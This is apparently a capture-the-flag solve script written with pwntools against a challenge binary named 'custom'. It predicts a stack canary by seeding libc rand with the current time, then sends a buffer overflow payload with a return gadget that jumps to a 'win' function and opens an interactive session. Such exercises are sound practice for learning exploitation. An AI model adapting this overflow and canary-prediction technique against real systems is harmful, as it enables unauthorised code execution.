from pwn import *
from time import time
from ctypes import CDLL

libc = CDLL('libc.so.6')
elf = ELF("custom")
context.binary = elf

# p = remote("localhost", 5000)
p = process()

libc.srand(int(time()))

canary = libc.rand()

payload = b'a' * 72 + pack(canary) + b'a' * 8 + pack(0x000000000040101a) + pack(elf.symbols['win'])
p.sendline(payload)
p.interactive()